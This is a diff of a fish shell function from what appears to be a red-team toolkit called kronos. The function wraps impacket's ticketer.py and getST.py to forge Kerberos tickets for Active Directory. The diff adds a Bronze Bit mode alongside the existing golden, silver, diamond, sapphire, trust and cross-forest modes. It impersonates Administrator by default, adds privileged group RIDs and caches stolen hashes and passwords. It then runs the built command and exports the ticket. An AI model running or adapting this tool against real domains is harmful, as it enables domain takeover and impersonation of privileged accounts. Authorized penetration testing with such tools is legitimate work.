@@ -1,6 +1,6 @@
-# description: Create Golden, Silver, Diamond, Sapphire, Trust, and Cross-Forest Tickets
-function __kronos_ticket --description "Create advanced AD tickets using ticketer.py"
-    set -l ticket_types golden silver diamond sapphire trust cross-forest
+# description: Create Golden, Silver, Diamond, Sapphire, Trust, Cross-Forest, and Bronze Tickets
+function __kronos_ticket --description "Create advanced AD tickets using ticketer.py or getST.py"
+    set -l ticket_types golden silver diamond sapphire trust cross-forest bronze
     
     argparse h/help u/user= d/domain= S/sid= H/hash= s/spn= I/user-id= G/groups= A/auth-user= P/auth-pass= L/auth-hash= K/aes-key= E/extra-sid= q/quiet X/edit-cmd -- $argv
     or return 1
@@ -8,9 +8,17 @@ function __kronos_ticket --description "Create advanced AD tickets using tickete
     if set -q _flag_help
         echo "Usage: kronos ticket [subcommand] [OPTIONS]"
         echo ""
-        echo "Create advanced AD tickets using impacket's ticketer.py."
+        echo "Create advanced AD tickets using impacket's ticketer.py or getST.py."
+        echo ""
+        echo "Subcommands: golden, silver, diamond, sapphire, trust, cross-forest, bronze"
         echo ""
         echo "Options:"
+        echo "  -u, --user NAME      User to impersonate (default: Administrator)"
+        echo "  -d, --domain NAME    Target domain name"
+        echo "  -S, --sid SID        Domain SID"
+        echo "  -H, --hash HASH      Target NTLM hash (krbtgt, service, etc.)"
+        echo "  -s, --spn SPN        Target SPN (for silver/bronze tickets)"
+        echo "  -A, --auth-user NAME Service/Low-priv account for request-based attacks"
         echo "  -q, --quiet          Skip prompts and use cached/default values"
         echo "  -X, --edit-cmd       Inspect and edit the command before execution"
         echo "  -h, --help           Show this help message"
@@ -49,19 +57,21 @@ function __kronos_ticket --description "Create advanced AD tickets using tickete
     if test "$wizard" -eq 1
         set_color cyan; echo "[*] Starting $subaction ticket wizard..."; set_color normal
         
-        # 1. Hash
-        set -l hash_label "Target NTLM Hash"
-        switch "$subaction"
-            case golden cross-forest diamond sapphire; set hash_label "krbtgt NTLM Hash"
-            case silver; set hash_label "Service NTLM Hash"
-            case trust; set hash_label "Trust Account NTLM Hash"
+        # 1. Hash (NTLM of krbtgt or Service)
+        if test "$subaction" != "bronze" # Bronze uses Service Account credentials in a different way
+            set -l hash_label "Target NTLM Hash"
+            switch "$subaction"
+                case golden cross-forest diamond sapphire; set hash_label "krbtgt NTLM Hash"
+                case silver; set hash_label "Service NTLM Hash"
+                case trust; set hash_label "Trust Account NTLM Hash"
+            end
+            set -l def_hash "$__KRONOS_CACHE_HASH"
+            set -l src_hash "Cache"
+            if test -z "$def_hash"; set def_hash "$TGT_PASSWORD"; set src_hash "TGT_PASSWORD"; end
+            if test -n "$hash"; set def_hash "$hash"; set src_hash "CLI Arg"; end
+            set hash (__kronos_ask "$hash_label" "$def_hash" "$src_hash"); or return 1
+            set -U __KRONOS_CACHE_HASH "$hash"
         end
-        set -l def_hash "$__KRONOS_CACHE_HASH"
-        set -l src_hash "Cache"
-        if test -z "$def_hash"; set def_hash "$TGT_PASSWORD"; set src_hash "TGT_PASSWORD"; end
-        if test -n "$hash"; set def_hash "$hash"; set src_hash "CLI Arg"; end
-        set hash (__kronos_ask "$hash_label" "$def_hash" "$src_hash"); or return 1
-        set -U __KRONOS_CACHE_HASH "$hash"
 
         # 2. AES
         if contains -- "$subaction" golden diamond sapphire cross-forest
@@ -72,10 +82,12 @@ function __kronos_ticket --description "Create advanced AD tickets using tickete
         end
 
         # 3. SID
-        set -l def_sid "$__KRONOS_CACHE_SID"
-        if test -n "$sid"; set def_sid "$sid"; end
-        set sid (__kronos_ask "Domain SID" "$def_sid"); or return 1
-        set -U __KRONOS_CACHE_SID "$sid"
+        if test "$subaction" != "bronze"
+            set -l def_sid "$__KRONOS_CACHE_SID"
+            if test -n "$sid"; set def_sid "$sid"; end
+            set sid (__kronos_ask "Domain SID" "$def_sid"); or return 1
+            set -U __KRONOS_CACHE_SID "$sid"
+        end
 
         # 4. Domain
         set -l def_domain "$__KRONOS_CACHE_DOMAIN"
@@ -88,7 +100,7 @@ function __kronos_ticket --description "Create advanced AD tickets using tickete
         set domain (__kronos_ask "Domain Name" "$def_domain" "$src_domain"); or return 1
         set -U __KRONOS_CACHE_DOMAIN "$domain"
 
-        # 5. User
+        # 5. User (Impersonated)
         set -l user_prompt "User to Impersonate"
         if test "$subaction" = "sapphire"; set user_prompt "User to Impersonate (via S4U2Self)"; end
         set -l def_user "$__KRONOS_CACHE_USER"
@@ -97,20 +109,38 @@ function __kronos_ticket --description "Create advanced AD tickets using tickete
         set user (__kronos_ask "$user_prompt" "$def_user"); or return 1
         set -U __KRONOS_CACHE_USER "$user"
 
-        if test "$subaction" = "diamond" -o "$subaction" = "sapphire"
-            # Low priv auth
+        # 6. SPN (Silver/Bronze)
+        if test "$subaction" = "silver" -o "$subaction" = "bronze" -o "$subaction" = "trust"
+            set -l def_spn "$__KRONOS_CACHE_TICKET_SPN"
+            if test -n "$spn"; set def_spn "$spn"; end
+            set spn (__kronos_ask "Target SPN (e.g. cifs/srv01.domain.local)" "$def_spn"); or return 1
+            set -U __KRONOS_CACHE_TICKET_SPN "$spn"
+        end
+
+        # 7. Auth Credentials (Diamond, Sapphire, Bronze)
+        if contains -- "$subaction" diamond sapphire bronze
+            set -l user_label "Auth Username"
+            if test "$subaction" = "bronze"; set user_label "Service Account Username"; end
+            
             set -l def_auth_user "$__KRONOS_CACHE_AUTH_USER"
             set -l src_user "Cache"
             if test -z "$def_auth_user"
                 set def_auth_user "$TGT_USERNAME"; set src_user "TGT_USERNAME"
             end
-            set auth_user (__kronos_ask "Low-priv Auth Username" "$def_auth_user" "$src_user"); or return 1
+            if test -n "$auth_user"; set def_auth_user "$auth_user"; set src_user "CLI Arg"; end
+            set auth_user (__kronos_ask "$user_label" "$def_auth_user" "$src_user"); or return 1
             set -U __KRONOS_CACHE_AUTH_USER "$auth_user"
 
             set -l def_auth_val "$__KRONOS_CACHE_AUTH_VAL"
-            if test -z "$def_auth_val"; set def_auth_val "$TGT_PASSWORD"; end
-            set -l auth_input (__kronos_ask "Low-priv Auth Password or Hash" "$def_auth_val"); or return 1
+            set -l src_auth_val "Cache"
+            if test -z "$def_auth_val"
+                set def_auth_val "$TGT_PASSWORD"; set src_auth_val "TGT_PASSWORD"
+            end
+            if test -n "$auth_pass"; set def_auth_val "$auth_pass"; set src_auth_val "CLI Pass"; end
+            if test -n "$auth_hash"; set def_auth_val "$auth_hash"; set src_auth_val "CLI Hash"; end
+            set -l auth_input (__kronos_ask "Auth Password or Hash" "$def_auth_val" "$src_auth_val"); or return 1
             set -U __KRONOS_CACHE_AUTH_VAL "$auth_input"
+            
             if string match -rq '^[a-fA-F0-9]{32}:[a-fA-F0-9]{32}$|^[a-fA-F0-9]{32}$' -- "$auth_input"
                 set auth_hash "$auth_input"; set auth_pass ""
             else
@@ -118,58 +148,84 @@ function __kronos_ticket --description "Create advanced AD tickets using tickete
             end
         end
     else
-        # Fallbacks
+        # Fallbacks for non-wizard mode
         if test -z "$domain"
             set domain "$__KRONOS_CACHE_DOMAIN"
             if test -z "$domain"; set domain "$TGT_HOSTS[1]"; end
             if test -z "$domain"; set domain "$TGT_DC_DOMAIN"; end
         end
-        if test -z "$hash"
-            set hash "$__KRONOS_CACHE_HASH"
-            if test -z "$hash"; set hash "$TGT_PASSWORD"; end
+        if test -z "$user"; set user "Administrator"; end
+    end
+
+    set -l target "$TGT"
+    if test -z "$target"; set target "$TGT_DC_IP"; end
+    if test -z "$target"; set target "$TGT_DC"; end
+
+    set -l final_cmd ""
+
+    if test "$subaction" = "bronze"
+        # Bronze Bit uses getST.py
+        set -l impacket_cmd ""
+        if command -v getST.py >/dev/null; set impacket_cmd getST.py
+        else if command -v impacket-getST >/dev/null; set impacket_cmd impacket-getST
+        else; echo "error: getST.py not found."; return 1; end
+
+        set -l st_args -spn "$spn" -impersonate "$user" -bronzebit -dc-ip "$target"
+        if test -n "$auth_hash"
+            set -a st_args -hashes ":$auth_hash"
+        else
+            set -a st_args -password "$auth_pass"
         end
+        set -a st_args "$domain/$auth_user"
+
+        set final_cmd "$impacket_cmd "(string join ' ' -- $st_args)
+    else
+        # All others use ticketer.py
+        set -l impacket_cmd ""
+        if command -v ticketer.py >/dev/null; set impacket_cmd ticketer.py
+        else if command -v impacket-ticketer >/dev/null; set impacket_cmd impacket-ticketer
+        else; echo "error: ticketer not found."; return 1; end
+
+        set -l ticket_args -nthash "$hash" -domain-sid "$sid" -domain "$domain"
+        if test -n "$aes_key"; set -a ticket_args -aesKey "$aes_key"; end
+        if test -n "$target"; set -a ticket_args -dc-ip "$target"; end
+
+        set -l final_target_user "$user"
+        switch "$subaction"
+            case diamond
+                set -a ticket_args -request -user "$domain/$auth_user"
+                if test -n "$user_id"; set -a ticket_args -user-id "$user_id"; else; set -a ticket_args -user-id 500; end
+                if test -n "$groups"; set -a ticket_args -groups "$groups"; else; set -a ticket_args -groups "512,513,518,519,520"; end
+                if test -n "$auth_hash"; set -a ticket_args -hashes "$auth_hash" -password "";
+                else; set -a ticket_args -password "$auth_pass"; end
+            case sapphire
+                set -a ticket_args -request -user "$auth_user" -user-id "$user_id" -impersonate "$user"
+                if test -n "$auth_hash"; set -a ticket_args -hashes "$auth_hash" -password "";
+                else; set -a ticket_args -password "$auth_pass"; end
+                set final_target_user "baduser"
+            case silver trust
+                set -a ticket_args -spn "$spn"
+            case cross-forest
+                set -a ticket_args -extra-sid "$extra_sid"
+        end
+        set -a ticket_args "$final_target_user"
+        set final_cmd "$impacket_cmd "(string join ' ' -- $ticket_args)
     end
 
-    set -l impacket_cmd ""
-    if command -v ticketer.py >/dev/null; set impacket_cmd ticketer.py
-    else if command -v impacket-ticketer >/dev/null; set impacket_cmd impacket-ticketer
-    else; echo "error: ticketer not found."; return 1; end
+    if set -q _flag_edit_cmd; set final_cmd (__kronos_edit_cmd "$final_cmd"); or return 1; end
 
-    set -l ticket_args -nthash "$hash" -domain-sid "$sid" -domain "$domain"
-    if test -n "$aes_key"; set -a ticket_args -aesKey "$aes_key"; end
-    if test -n "$TGT"; set -a ticket_args -dc-ip "$TGT"
-    else if test -n "$TGT_DC_IP"; set -a ticket_args -dc-ip "$TGT_DC_IP"; end
-
-    set -l final_user "$user"
-    switch "$subaction"
-        case diamond
-            set -a ticket_args -request -user "$domain/$auth_user"
-            if test -n "$user_id"; set -a ticket_args -user-id "$user_id"; else; set -a ticket_args -user-id 500; end
-            if test -n "$groups"; set -a ticket_args -groups "$groups"; else; set -a ticket_args -groups "512,513,518,519,520"; end
-            
-            if test -n "$auth_hash"; set -a ticket_args -hashes "$auth_hash" -password "";
-            else; set -a ticket_args -password "$auth_pass"; end
-        case sapphire
-            set -a ticket_args -request -user "$auth_user" -user-id "$user_id" -impersonate "$user"
-            if test -n "$auth_hash"; set -a ticket_args -hashes "$auth_hash" -password "";
-            else; set -a ticket_args -password "$auth_pass"; end
-            set final_user "baduser"
-        case silver trust
-            set -a ticket_args -spn "$spn"
-        case cross-forest
-            set -a ticket_args -extra-sid "$extra_sid"
-    end
-    set -a ticket_args "$final_user"
-
-    set -l full_cmd "$impacket_cmd "(string join ' ' -- $ticket_args)
-    if set -q _flag_edit_cmd; set full_cmd (__kronos_edit_cmd "$full_cmd"); or return 1; end
-
-    __kronos_check_dep $impacket_cmd; or return 1
-    echo "[*] Forging ticket via $impacket_cmd..."
-    eval $full_cmd
+    set -l bin (string split ' ' -- $final_cmd)[1]
+    __kronos_check_dep $bin; or return 1
     
-    if test -f "$final_user.ccache"
-        set -gx KRB5CCNAME "$PWD/$final_user.ccache"
+    echo "[*] Forging $subaction ticket via $bin..."
+    eval $final_cmd
+    
+    # Export KRB5CCNAME if successful
+    set -l forged_user "$user"
+    if test "$subaction" = "sapphire"; set forged_user "baduser"; end
+    
+    if test -f "$forged_user.ccache"
+        set -gx KRB5CCNAME "$PWD/$forged_user.ccache"
         echo "[+] Ticket saved and exported to KRB5CCNAME=$KRB5CCNAME"
     end
 end
